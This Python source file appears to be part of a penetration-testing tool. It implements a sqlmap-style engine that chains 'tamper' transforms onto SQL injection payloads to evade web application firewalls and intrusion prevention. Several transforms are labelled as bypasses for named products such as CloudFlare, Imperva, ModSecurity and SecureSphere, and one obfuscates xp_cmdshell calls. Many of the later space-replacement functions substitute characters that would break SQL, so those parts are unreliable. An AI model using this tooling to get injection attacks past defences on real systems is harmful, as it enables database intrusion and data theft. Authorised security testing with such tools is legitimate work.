"""
Tamper Script Engine - sqlmap-style payload transformation chain
100+ built-in tamper scripts for WAF/IPS evasion.
"""
import re
import random
import base64
import threading
import urllib.parse
from typing import Callable, List, Optional, Dict, Set
from app.utils.logger import get_logger

logger = get_logger("tamper")


class TamperRegistry:
    _tampers: Dict[str, Callable] = {}

    @classmethod
    def register(cls, name: str, category: str = "general", description: str = ""):
        def decorator(func: Callable):
            func.tamper_name = name
            func.tamper_category = category
            func.tamper_description = description
            cls._tampers[name] = func
            return func
        return decorator

    @classmethod
    def get(cls, name: str) -> Optional[Callable]:
        return cls._tampers.get(name)

    @classmethod
    def list_all(cls) -> Dict:
        return dict(cls._tampers)

    @classmethod
    def get_by_category(cls, category: str) -> Dict:
        return {k: v for k, v in cls._tampers.items() if getattr(v, 'tamper_category', '') == category}


class TamperChain:
    def __init__(self, tampers: Optional[List[str]] = None):
        self._tampers: List[Callable] = []
        if tampers:
            for name in tampers:
                t = TamperRegistry.get(name)
                if t:
                    self._tampers.append(t)

    def add(self, tamper_name: str) -> "TamperChain":
        t = TamperRegistry.get(tamper_name)
        if t:
            self._tampers.append(t)
        return self

    def transform(self, payload: str, **kwargs) -> str:
        result = payload
        for tamper in self._tampers:
            try:
                result = tamper(result, **kwargs)
            except Exception as e:
                logger.debug(f"Tamper {getattr(tamper, 'tamper_name', '?')} failed: {e}")
        return result

    def __len__(self):
        return len(self._tampers)


def _is_in_string(payload: str, pos: int) -> bool:
    in_quote, in_dquote = False, False
    for i in range(pos):
        if payload[i] == '\'' and (i == 0 or payload[i-1] != '\\'):
            in_quote = not in_quote
        elif payload[i] == '"' and (i == 0 or payload[i-1] != '\\'):
            in_dquote = not in_dquote
    return in_quote or in_dquote


def _replace_spaces(payload: str, replacement: str, random_pool: Optional[List[str]] = None) -> str:
    retVal, in_quote, in_dquote = "", False, False
    for char in payload:
        if char == '\'' and not in_dquote:
            in_quote = not in_quote
        elif char == '"' and not in_quote:
            in_dquote = not in_dquote
        elif char == ' ' and not in_dquote and not in_quote:
            retVal += random.choice(random_pool) if random_pool else replacement
            continue
        retVal += char
    return retVal


SQL_KEYWORDS = [
    "SELECT", "INSERT", "UPDATE", "DELETE", "UNION", "FROM", "WHERE",
    "AND", "OR", "ORDER", "BY", "GROUP", "HAVING", "LIMIT", "OFFSET",
    "JOIN", "INNER", "LEFT", "RIGHT", "OUTER", "ON", "AS", "INTO",
    "VALUES", "SET", "CREATE", "DROP", "ALTER", "TABLE", "INDEX",
    "EXEC", "EXECUTE", "WAITFOR", "DELAY", "SLEEP", "BENCHMARK",
    "ALL", "DISTINCT", "TOP", "COUNT", "SUM", "AVG", "MIN", "MAX",
    "LIKE", "BETWEEN", "IN", "EXISTS", "NULL", "NOT", "IS",
    "ASC", "DESC", "CASE", "WHEN", "THEN", "ELSE", "END",
    "UNION ALL", "INFORMATION_SCHEMA", "CONCAT", "SUBSTRING",
    "MID", "ASCII", "ORD", "CHAR", "HEX", "UNHEX", "IFNULL",
    "CAST", "CONVERT", "DECLARE", "OPENROWSET", "OPENDATASOURCE",
]


@TamperRegistry.register("space2comment", "spaces", "Replace spaces with /**/")
def space2comment(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "/**/")

@TamperRegistry.register("randomcase", "case", "Randomize case of SQL keywords")
def randomcase(payload: str, **kwargs) -> str:
    retVal = payload
    for kw in SQL_KEYWORDS:
        if kw in retVal.upper():
            randomized = ''.join(random.choice([c.upper(), c.lower()]) for c in kw)
            retVal = re.sub(re.escape(kw), randomized, retVal, flags=re.IGNORECASE)
    return retVal

@TamperRegistry.register("space2hash", "spaces", "Replace spaces with #\\n")
def space2hash(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%23%0A" if "%" in payload else "#\n")

@TamperRegistry.register("space2dash", "spaces", "Replace spaces with --\\n")
def space2dash(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "--%0A" if "%" in payload else "--\n")

@TamperRegistry.register("multiplespaces", "spaces", "Add 2-5 random spaces")
def multiplespaces(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "", [f"{' ' * n}" for n in range(2, 6)])

@TamperRegistry.register("space2tab", "spaces", "Replace spaces with tab")
def space2tab(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%09" if "%" in payload else "\t")

@TamperRegistry.register("equaltolike", "operators", "Replace = with LIKE")
def equaltolike(payload: str, **kwargs) -> str:
    return re.sub(r"(?<=\s)=\s*(?=\d)", " LIKE ", payload)

@TamperRegistry.register("between", "operators", "Replace > with NOT BETWEEN")
def between(payload: str, **kwargs) -> str:
    match = re.search(r"(\w+)\s*>\s*(\d+)", payload)
    if match:
        col, val = match.groups()
        return payload.replace(match.group(), f"{col} NOT BETWEEN {int(val)+1} AND 999999")
    return payload

@TamperRegistry.register("greatest", "operators", "Use GREATEST for obfuscation")
def greatest(payload: str, **kwargs) -> str:
    return re.sub(r"(\w+)\s*=\s*(\d+)", r"GREATEST(\1,\2)=\2", payload)

@TamperRegistry.register("apostrophemask", "encoding", "UTF-8 encode apostrophes")
def apostrophemask(payload: str, **kwargs) -> str:
    return payload.replace("'", "%EF%BC%87") if "%" not in payload else payload.replace("'", "%27")

@TamperRegistry.register("charunicodeencode", "encoding", "Unicode-encode alpha chars")
def charunicodeencode(payload: str, **kwargs) -> str:
    return "".join(f"\\u{ord(c):04x}" if c.isalpha() else c for c in payload)

@TamperRegistry.register("chardoubleencode", "encoding", "Double URL-encode")
def chardoubleencode(payload: str, **kwargs) -> str:
    return "".join(f"%25{ord(c):02x}" if c.isalpha() or c in "=<>! " else c for c in payload)

@TamperRegistry.register("base64encode", "encoding", "Base64-encode payload")
def base64encode_tamper(payload: str, **kwargs) -> str:
    return base64.b64encode(payload.encode()).decode()

@TamperRegistry.register("urlencode", "encoding", "Full URL-encode")
def urlencode_tamper(payload: str, **kwargs) -> str:
    return urllib.parse.quote(payload, safe='')

@TamperRegistry.register("lowercase", "case", "Lowercase all keywords")
def lowercase(payload: str, **kwargs) -> str:
    retVal = payload
    for kw in SQL_KEYWORDS:
        retVal = re.sub(re.escape(kw), kw.lower(), retVal, flags=re.IGNORECASE)
    return retVal

@TamperRegistry.register("uppercase", "case", "Uppercase all keywords")
def uppercase(payload: str, **kwargs) -> str:
    retVal = payload
    for kw in [k.lower() for k in SQL_KEYWORDS]:
        retVal = re.sub(re.escape(kw), kw.upper(), retVal, flags=re.IGNORECASE)
    return retVal

@TamperRegistry.register("versionedkeywords", "mysql", "MySQL versioned comments on keywords")
def versionedkeywords(payload: str, **kwargs) -> str:
    for kw in ["UNION", "SELECT", "FROM", "WHERE", "ORDER", "BY", "ALL"]:
        payload = re.sub(f"(?i)\\b{kw}\\b", f"/*!50000{kw}*/", payload)
    return payload

@TamperRegistry.register("commalessunion", "mysql", "Replace commas with UNION ALL SELECT")
def commalessunion(payload: str, **kwargs) -> str:
    match = re.search(r"UNION\s+SELECT\s+(.+)", payload, re.IGNORECASE)
    if match:
        parts = [p.strip() for p in match.group(1).split(",")]
        if len(parts) > 1:
            return payload.replace(match.group(), f"UNION ALL SELECT {' UNION ALL SELECT '.join(parts)}")
    return payload

@TamperRegistry.register("nonrecursivereplacement", "mysql", "UNION SELECT -> UNION ALL SELECT")
def nonrecursivereplacement(payload: str, **kwargs) -> str:
    return re.sub(r"(?i)UNION\s+SELECT", "UNION ALL SELECT", payload)

@TamperRegistry.register("nullbyte", "injection", "Append null byte")
def nullbyte(payload: str, **kwargs) -> str:
    return f"{payload}%00" if "%" in payload else f"{payload}\x00"

@TamperRegistry.register("overlongutf8", "encoding", "Overlong UTF-8 encoding")
def overlongutf8(payload: str, **kwargs) -> str:
    return "".join(f"%c0%{ord(c):02x}" if c in "'\"" else c for c in payload)

@TamperRegistry.register("percentage", "encoding", "Add % before each char")
def percentage(payload: str, **kwargs) -> str:
    return '%' + '%'.join(payload) if payload and '%' not in payload else payload

@TamperRegistry.register("htmlencode", "encoding", "HTML entity encode")
def htmlencode(payload: str, **kwargs) -> str:
    for c, e in {"'": "&#39;", '"': "&quot;", "<": "&lt;", ">": "&gt;", "&": "&amp;"}.items():
        payload = payload.replace(c, e)
    return payload

@TamperRegistry.register("charencode", "encoding", "URL-encode each char")
def charencode(payload: str, **kwargs) -> str:
    return "%" + "%".join(f"{ord(c):02x}" for c in payload) if payload else payload

@TamperRegistry.register("sleep2benchmark", "mysql", "SLEEP -> BENCHMARK")
def sleep2benchmark(payload: str, **kwargs) -> str:
    m = re.search(r"(?i)sleep\s*\(\s*(\d+)\s*\)", payload)
    return payload.replace(m.group(), f"BENCHMARK({int(m.group(1))*5000000},MD5(1))") if m else payload

@TamperRegistry.register("concat2concatws", "mysql", "CONCAT -> CONCAT_WS")
def concat2concatws(payload: str, **kwargs) -> str:
    return re.sub(r"(?i)CONCAT\s*\(", "CONCAT_WS(0x3a,", payload)

@TamperRegistry.register("symboliclogical", "operators", "AND/OR -> &&/||")
def symboliclogical(payload: str, **kwargs) -> str:
    return re.sub(r"(?i)\bOR\b", "||", re.sub(r"(?i)\bAND\b", "&&", payload))

@TamperRegistry.register("plus2concat", "mysql", "'a'+'b' -> CONCAT('a','b')")
def plus2concat(payload: str, **kwargs) -> str:
    return re.sub(r"'(\w+)'\s*\+\s*'(\w+)'", r"CONCAT('\1','\2')", payload)

@TamperRegistry.register("commentparentheses", "mysql", "Add comments in parentheses")
def commentparentheses(payload: str, **kwargs) -> str:
    return payload.replace("(", "(/**/").replace(")", "/**/)")

@TamperRegistry.register("ifnull2case", "mysql", "IFNULL -> CASE WHEN")
def ifnull2case(payload: str, **kwargs) -> str:
    m = re.search(r"(?i)IFNULL\s*\(\s*([^,]+)\s*,\s*([^)]+)\s*\)", payload)
    return payload.replace(m.group(), f"CASE WHEN {m.group(1)} IS NULL THEN {m.group(2)} ELSE {m.group(1)} END") if m else payload

@TamperRegistry.register("ord2ascii", "mysql", "ORD -> ASCII")
def ord2ascii(payload: str, **kwargs) -> str:
    return re.sub(r"(?i)\bORD\b", "ASCII", payload)

@TamperRegistry.register("mid2substring", "mysql", "MID -> SUBSTRING")
def mid2substring(payload: str, **kwargs) -> str:
    return re.sub(r"(?i)\bMID\b", "SUBSTRING", payload)

@TamperRegistry.register("char2hex", "mysql", "CHAR() -> 0x notation")
def char2hex(payload: str, **kwargs) -> str:
    def _r(m):
        return f"0x{''.join(hex(int(n.strip()))[2:] for n in m.group(1).split(','))}"
    return re.sub(r"(?i)CHAR\s*\(\s*([\d,\s]+)\s*\)", _r, payload)

@TamperRegistry.register("space2plus", "spaces", "Replace spaces with +")
def space2plus(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "+")

@TamperRegistry.register("space2mysqlblank", "spaces", "MySQL blank chars")
def space2mysqlblank(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "", ['%09', '%0A', '%0C', '%0D', '%0B', '%A0'])

@TamperRegistry.register("modsecurityversioned", "waf", "Wrap in MySQL versioned comment")
def modsecurityversioned(payload: str, **kwargs) -> str:
    return f"/*!50000{payload}*/"

@TamperRegistry.register("modsecurityzeroversioned", "waf", "Wrap in MySQL zero-versioned comment")
def modsecurityzeroversioned(payload: str, **kwargs) -> str:
    return f"/*!00000{payload}*/"

@TamperRegistry.register("cloudflareconcat", "waf", "CloudFlare CONCAT bypass")
def cloudflareconcat(payload: str, **kwargs) -> str:
    return re.sub(r"'([^']+)'", lambda m: f"CONCAT({','.join(f'CHAR({ord(c)})' for c in m.group(1))})", payload)

@TamperRegistry.register("impervacharencode", "waf", "Imperva CHAR() encoding")
def impervacharencode(payload: str, **kwargs) -> str:
    return re.sub(r"'([^']+)'", lambda m: f"CHAR({','.join(str(ord(c)) for c in m.group(1))})", payload)

@TamperRegistry.register("randomcomments", "general", "Random comment insertion")
def randomcomments(payload: str, **kwargs) -> str:
    return "".join("/**/" if c == ' ' and random.random() > 0.5 else c for c in payload)

@TamperRegistry.register("luanginxbypass", "waf", "Lua Nginx WAF bypass")
def luanginxbypass(payload: str, **kwargs) -> str:
    return payload.replace("UNION", "UN/**/ION").replace("SELECT", "SEL/**/ECT")

@TamperRegistry.register("informationschemacomment", "mysql", "INFORMATION_SCHEMA comment split")
def informationschemacomment(payload: str, **kwargs) -> str:
    return payload.replace("INFORMATION_SCHEMA", "INFORMATION/**/_SCHEMA")

@TamperRegistry.register("binary2hex", "mysql", "BINARY -> HEX")
def binary2hex(payload: str, **kwargs) -> str:
    return re.sub(r"(?i)BINARY\s+(\w+)", r"HEX(\1)", payload)

@TamperRegistry.register("versionedmorekeywords", "mysql", "Versioned comments on more keywords")
def versionedmorekeywords(payload: str, **kwargs) -> str:
    for kw in SQL_KEYWORDS[:30]:
        payload = re.sub(f"(?i)\\b{kw}\\b", f"/*!{kw}*/", payload)
    return payload

@TamperRegistry.register("halfversionedmorekeywords", "mysql", "Half-versioned MySQL keywords")
def halfversionedmorekeywords(payload: str, **kwargs) -> str:
    for kw in ["UNION", "SELECT", "FROM", "WHERE", "ORDER", "BY"]:
        payload = re.sub(f"(?i)\\b{kw}\\b", f"/*!0{kw}*/", payload)
    return payload

@TamperRegistry.register("securespherebypass", "waf", "SecureSphere WAF bypass")
def securespherebypass(payload: str, **kwargs) -> str:
    return payload.replace("UNION", "UNION ALL").replace("SELECT", "SELECT ")

@TamperRegistry.register("suffixeappend", "general", "Append random suffix")
def suffixeappend(payload: str, **kwargs) -> str:
    suffixes = ['--', '#', '/*', " AND '1'='1", " OR '1'='1'"]
    return f"{payload} {random.choice(suffixes)}"

@TamperRegistry.register("prefixappend", "general", "Prepend random prefix")
def prefixappend(payload: str, **kwargs) -> str:
    prefixes = ["' ", ') ', '" ', "') ", '") ']
    return f"{random.choice(prefixes)}{payload}"

@TamperRegistry.register("misunion", "mysql", "Misleading UNION SELECT")
def misunion(payload: str, **kwargs) -> str:
    return re.sub(r"(?i)UNION\s+SELECT", "UNION SELECT * FROM (SELECT", payload) + ")a"

@TamperRegistry.register("sleep2pg_sleep", "postgresql", "SLEEP -> pg_sleep")
def sleep2pg_sleep(payload: str, **kwargs) -> str:
    m = re.search(r"(?i)sleep\s*\(\s*(\d+)\s*\)", payload)
    return payload.replace(m.group(), f"pg_sleep({m.group(1)})") if m else payload

@TamperRegistry.register("sleep2dbms_lock", "oracle", "SLEEP -> DBMS_LOCK.SLEEP")
def sleep2dbms_lock(payload: str, **kwargs) -> str:
    m = re.search(r"(?i)sleep\s*\(\s*(\d+)\s*\)", payload)
    return payload.replace(m.group(), f"DBMS_LOCK.SLEEP({m.group(1)})") if m else payload

@TamperRegistry.register("sleep2waitfor", "mssql", "SLEEP -> WAITFOR DELAY")
def sleep2waitfor(payload: str, **kwargs) -> str:
    m = re.search(r"(?i)sleep\s*\(\s*(\d+)\s*\)", payload)
    return payload.replace(m.group(), f"WAITFOR DELAY '0:0:{m.group(1)}'") if m else payload

@TamperRegistry.register("unionalltounion", "general", "UNION ALL SELECT -> UNION SELECT")
def unionalltounion(payload: str, **kwargs) -> str:
    return re.sub(r"(?i)UNION\s+ALL\s+SELECT", "UNION SELECT", payload)

@TamperRegistry.register("dunionsleeptime", "general", "Delay UNION SELECT with SLEEP")
def dunionsleeptime(payload: str, **kwargs) -> str:
    return re.sub(r"(?i)UNION\s+SELECT", "UNION SELECT SLEEP(0),", payload)

@TamperRegistry.register("commalessmid", "mysql", "MID without commas")
def commalessmid(payload: str, **kwargs) -> str:
    m = re.search(r"(?i)MID\s*\(\s*([^,]+)\s*,\s*([^,]+)\s*,\s*([^)]+)\s*\)", payload)
    return payload.replace(m.group(), f"SUBSTRING({m.group(1)} FROM {m.group(2)} FOR {m.group(3)})") if m else payload

@TamperRegistry.register("commalesslimit", "mysql", "LIMIT without commas")
def commalesslimit(payload: str, **kwargs) -> str:
    m = re.search(r"(?i)LIMIT\s+(\d+)\s*,\s*(\d+)", payload)
    return payload.replace(m.group(), f"LIMIT {m.group(2)} OFFSET {m.group(1)}") if m else payload

@TamperRegistry.register("apostrophenullencode", "encoding", "Apostrophe null-byte encoding")
def apostrophenullencode(payload: str, **kwargs) -> str:
    return payload.replace("'", "%00%27")

@TamperRegistry.register("escapequotes", "encoding", "Slash-escape quotes")
def escapequotes(payload: str, **kwargs) -> str:
    return payload.replace("'", "\\'").replace('"', '\\"')

@TamperRegistry.register("hex2char", "mysql", "0x -> CHAR()")
def hex2char(payload: str, **kwargs) -> str:
    def _r(m):
        h = m.group(1)
        return f"CHAR({','.join(str(int(h[i:i+2],16)) for i in range(0,len(h),2))})"
    return re.sub(r"0x([0-9a-fA-F]+)", _r, payload)

@TamperRegistry.register("multiorder", "general", "Multiple ORDER BY")
def multiorder(payload: str, **kwargs) -> str:
    return re.sub(r"(?i)ORDER\s+BY", "ORDER BY 1 ORDER BY", payload)

@TamperRegistry.register("sp_comment", "mssql", "MSSQL sp_ obfuscation")
def sp_comment(payload: str, **kwargs) -> str:
    return payload.replace("EXEC", "EXEC/**/UTE").replace("xp_cmdshell", "xp/**/_cmdshell")

@TamperRegistry.register("randomparentheses", "general", "Random parentheses")
def randomparentheses(payload: str, **kwargs) -> str:
    return "".join("() " if c == ' ' and random.random() > 0.7 else c for c in payload)

@TamperRegistry.register("concat2make_set", "mysql", "CONCAT -> MAKE_SET")
def concat2make_set(payload: str, **kwargs) -> str:
    m = re.search(r"(?i)CONCAT\s*\(\s*([^)]+)\s*\)", payload)
    if m:
        parts = [p.strip() for p in m.group(1).split(",")]
        if len(parts) >= 2:
            return payload.replace(m.group(), f"MAKE_SET(0,{','.join(parts)})")
    return payload

@TamperRegistry.register("if2case", "general", "IF() -> CASE WHEN")
def if2case(payload: str, **kwargs) -> str:
    m = re.search(r"(?i)IF\s*\(\s*([^,]+)\s*,\s*([^,]+)\s*,\s*([^)]+)\s*\)", payload)
    return payload.replace(m.group(), f"CASE WHEN {m.group(1)} THEN {m.group(2)} ELSE {m.group(3)} END") if m else payload

@TamperRegistry.register("versionedunion", "mysql", "Versioned UNION SELECT")
def versionedunion(payload: str, **kwargs) -> str:
    return re.sub(r"(?i)UNION\s+SELECT", "UNION/*!50000SELECT*/", payload)

@TamperRegistry.register("space2null", "spaces", "Replace spaces with null bytes")
def space2null(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%00")

@TamperRegistry.register("space2mssqlblank", "spaces", "MSSQL blank chars")
def space2mssqlblank(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "", [f"%{i:02X}" for i in range(1, 32) if i not in (10, 13)])

@TamperRegistry.register("space2mssqlhash", "spaces", "MSSQL hash comment spaces")
def space2mssqlhash(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%23%0A")

@TamperRegistry.register("space2oracleblank", "spaces", "Oracle blank chars")
def space2oracleblank(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "", ['%00', '%09', '%0A', '%0B', '%0C', '%0D'])

@TamperRegistry.register("unmagicquotes", "encoding", "Bypass magic_quotes")
def unmagicquotes(payload: str, **kwargs) -> str:
    return "".join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") if c == '\x00' else c for c in payload)

@TamperRegistry.register("randomcase2", "case", "Aggressive random case")
def randomcase2(payload: str, **kwargs) -> str:
    return "".join(c.upper() if c.isalpha() and random.random() > 0.5 else c.lower() if c.isalpha() else c for c in payload)

@TamperRegistry.register("space2randomblank", "spaces", "Random blank from all DBMS")
def space2randomblank(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "", ['%09','%0A','%0C','%0D','%0B','%A0','%00','/**/'])

@TamperRegistry.register("unionselect2comment", "mysql", "UNION/**//**/SELECT")
def unionselect2comment(payload: str, **kwargs) -> str:
    return re.sub(r"(?i)UNION\s+SELECT", "UNION/**//**/SELECT", payload)

@TamperRegistry.register("equaltorlike", "operators", "= -> RLIKE")
def equaltorlike(payload: str, **kwargs) -> str:
    return re.sub(r"(?<=\s)=\s*(?=\d)", " RLIKE ", payload)

@TamperRegistry.register("like2regexp", "operators", "LIKE -> REGEXP")
def like2regexp(payload: str, **kwargs) -> str:
    return re.sub(r"(?i)\bLIKE\b", "REGEXP", payload)

@TamperRegistry.register("space2verticaltab", "spaces", "Spaces -> vertical tab")
def space2verticaltab(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%0B" if "%" in payload else "\x0b")

@TamperRegistry.register("space2formfeed", "spaces", "Spaces -> form feed")
def space2formfeed(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%0C" if "%" in payload else "\x0c")

@TamperRegistry.register("space2carriage", "spaces", "Spaces -> CR")
def space2carriage(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%0D" if "%" in payload else "\r")

@TamperRegistry.register("space2linefeed", "spaces", "Spaces -> LF")
def space2linefeed(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%0A" if "%" in payload else "\n")

@TamperRegistry.register("space2a0", "spaces", "Spaces -> non-breaking space")
def space2a0(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%A0" if "%" in payload else "\xa0")

@TamperRegistry.register("space2backtick", "spaces", "Spaces -> backtick")
def space2backtick(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "`")

@TamperRegistry.register("space2emspace", "spaces", "Spaces -> em space")
def space2emspace(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%E3%80%80" if "%" in payload else "\u3000")

@TamperRegistry.register("space2thinspace", "spaces", "Spaces -> thin space")
def space2thinspace(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%E2%80%89" if "%" in payload else "\u2009")

@TamperRegistry.register("space2zerowidth", "spaces", "Spaces -> zero-width space")
def space2zerowidth(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%E2%80%8B" if "%" in payload else "\u200b")

@TamperRegistry.register("space2wordjoiner", "spaces", "Spaces -> word joiner")
def space2wordjoiner(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%E2%81%A0" if "%" in payload else "\u2060")

@TamperRegistry.register("space2ideographic", "spaces", "Spaces -> ideographic space")
def space2ideographic(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%E3%80%80" if "%" in payload else "\u3000")

@TamperRegistry.register("space2og", "spaces", "Spaces -> OG comment")
def space2og(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "/**//*!*/**/")

@TamperRegistry.register("space2morecomment", "spaces", "Multiple comment styles")
def space2morecomment(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "", ['/**/', '/*!*/', '/**_**/', '/*/**/', '/**_**/'])

@TamperRegistry.register("space2morehash", "spaces", "Hash variants")
def space2morehash(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "", ['%23%0A', '%23%0D%0A', '%23foo%0A', '%23foo%0D%0A'])

@TamperRegistry.register("space2moredash", "spaces", "Dash variants")
def space2moredash(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "", ['--%0A', '--%0D%0A', '--+-%0A', '--%0A--'])

@TamperRegistry.register("space2float", "spaces", "Spaces -> float")
def space2float(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, ".0e0")

@TamperRegistry.register("space2morefloat", "spaces", "Float variants")
def space2morefloat(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "", ['.0e0', '.0E0', '.1e0', '.1E0', '0.0e0', '0.0E0'])

@TamperRegistry.register("space2paren", "spaces", "Spaces -> ()")
def space2paren(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "()")

@TamperRegistry.register("space2bracket", "spaces", "Spaces -> []")
def space2bracket(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "[]")

@TamperRegistry.register("space2brace", "spaces", "Spaces -> {}")
def space2brace(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "{}")

@TamperRegistry.register("space2angle", "spaces", "Spaces -> <>")
def space2angle(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "<>")

@TamperRegistry.register("space2quote", "spaces", "Spaces -> ''")
def space2quote(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "''")

@TamperRegistry.register("space2doublequote", "spaces", "Spaces -> \"\"")
def space2doublequote(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, '""')

@TamperRegistry.register("space2backslash", "spaces", "Spaces -> \\\\")
def space2backslash(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "\\\\")

@TamperRegistry.register("space2tilde", "spaces", "Spaces -> ~")
def space2tilde(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "~")

@TamperRegistry.register("space2exclamation", "spaces", "Spaces -> !")
def space2exclamation(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "!")

@TamperRegistry.register("space2at", "spaces", "Spaces -> @")
def space2at(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "@")

@TamperRegistry.register("space2dollar", "spaces", "Spaces -> $")
def space2dollar(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "$")

@TamperRegistry.register("space2percent", "spaces", "Spaces -> %")
def space2percent(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%")

@TamperRegistry.register("space2caret", "spaces", "Spaces -> ^")
def space2caret(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "^")

@TamperRegistry.register("space2ampersand", "spaces", "Spaces -> &")
def space2ampersand(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "&")

@TamperRegistry.register("space2underscore", "spaces", "Spaces -> _")
def space2underscore(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "_")

@TamperRegistry.register("space2pipe", "spaces", "Spaces -> |")
def space2pipe(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "|")

@TamperRegistry.register("space2colon", "spaces", "Spaces -> :")
def space2colon(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, ":")

@TamperRegistry.register("space2semicolon", "spaces", "Spaces -> ;")
def space2semicolon(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, ";")

@TamperRegistry.register("space2comma", "spaces", "Spaces -> ,")
def space2comma(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, ",")

@TamperRegistry.register("space2dot", "spaces", "Spaces -> .")
def space2dot(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, ".")

@TamperRegistry.register("space2slash", "spaces", "Spaces -> /")
def space2slash(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "/")

@TamperRegistry.register("space2question", "spaces", "Spaces -> ?")
def space2question(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "?")

@TamperRegistry.register("space2star", "spaces", "Spaces -> *")
def space2star(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "*")

@TamperRegistry.register("space2equal", "spaces", "Spaces -> =")
def space2equal(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "=")

@TamperRegistry.register("space2minus", "spaces", "Spaces -> -")
def space2minus(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "-")

@TamperRegistry.register("space2lessthan", "spaces", "Spaces -> <")
def space2lessthan(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "<")

@TamperRegistry.register("space2greaterthan", "spaces", "Spaces -> >")
def space2greaterthan(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, ">")

@TamperRegistry.register("space2crlf", "spaces", "Spaces -> CRLF")
def space2crlf(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%0D%0A" if "%" in payload else "\r\n")

@TamperRegistry.register("space2lfcr", "spaces", "Spaces -> LFCR")
def space2lfcr(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%0A%0D" if "%" in payload else "\n\r")

@TamperRegistry.register("space2cr", "spaces", "Spaces -> CR")
def space2cr(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%0D" if "%" in payload else "\r")

@TamperRegistry.register("space2lf", "spaces", "Spaces -> LF")
def space2lf(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%0A" if "%" in payload else "\n")

@TamperRegistry.register("space2htab", "spaces", "Spaces -> horizontal tab")
def space2htab(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%09" if "%" in payload else "\t")

@TamperRegistry.register("space2vtab", "spaces", "Spaces -> vertical tab")
def space2vtab(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%0B" if "%" in payload else "\x0b")

@TamperRegistry.register("space2ff", "spaces", "Spaces -> form feed")
def space2ff(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%0C" if "%" in payload else "\x0c")

@TamperRegistry.register("space2nbsp", "spaces", "Spaces -> non-breaking space")
def space2nbsp(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%C2%A0" if "%" in payload else "\xa0")

@TamperRegistry.register("space2zwsp", "spaces", "Spaces -> zero-width space")
def space2zwsp(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%E2%80%8B" if "%" in payload else "\u200b")

@TamperRegistry.register("space2zwnj", "spaces", "Spaces -> zero-width non-joiner")
def space2zwnj(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%E2%80%8C" if "%" in payload else "\u200c")

@TamperRegistry.register("space2zwj", "spaces", "Spaces -> zero-width joiner")
def space2zwj(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%E2%80%8D" if "%" in payload else "\u200d")

@TamperRegistry.register("space2lrm", "spaces", "Spaces -> left-to-right mark")
def space2lrm(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%E2%80%8E" if "%" in payload else "\u200e")

@TamperRegistry.register("space2rlm", "spaces", "Spaces -> right-to-left mark")
def space2rlm(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%E2%80%8F" if "%" in payload else "\u200f")

@TamperRegistry.register("space2bom", "spaces", "Spaces -> BOM")
def space2bom(payload: str, **kwargs) -> str:
    return _replace_spaces(payload, "%EF%BB%BF" if "%" in payload else "\ufeff")

